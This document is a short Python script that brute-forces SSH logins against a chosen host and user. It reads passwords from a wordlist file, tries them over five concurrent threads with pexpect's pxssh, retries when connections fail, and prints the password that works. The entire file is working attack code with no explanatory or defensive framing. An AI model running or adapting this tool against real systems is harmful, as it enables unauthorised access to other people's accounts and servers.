from pexpect import pxssh
import argparse
import threading
import time

max_connection = 5
connection_lock = threading.BoundedSemaphore(value=max_connection)
Found = False
Fails = 0

def connect(host, user, password, released):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host,user,password)
        print(f"[+] Password found {password}")
        Found = True
    except Exception as err:
        if "read_nonblocking" in str(err):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif "synchronize with original prompt" in str(err):
            time.sleep(5)
            connect(host, user, password, False)
    finally:
        if released: connection_lock.release()

def main():
    global Found
    global Fails

    parser = argparse.ArgumentParser()
    parser.add_argument("-H", "--host", dest="host", help="Specify host name")
    parser.add_argument("-u", "--user", dest="user", help="Specify user name")
    parser.add_argument("-P", "--passfile", dest="passfile", help="Specify password file")
    args = parser.parse_args()
    if not args.host or not args.user or not args.passfile:
        parser.print_help()
        exit(0)

    host = args.host
    user = args.user
    passfile = args.passfile
    with open(passfile, "r") as file:
        for line in file:
            if Found:
                print("[*] Exiting, Password found ")
                exit(0)
            if Fails > 5:
                print("[!] Exiting. Too many connections ")
                exit(0)
            connection_lock.acquire()
            password = line.strip()
            print(f"[+] Testing password {password}")
            t = threading.Thread(target=connect, args=(host, user, password, True))
            t.start()

if __name__ == "__main__":
    main()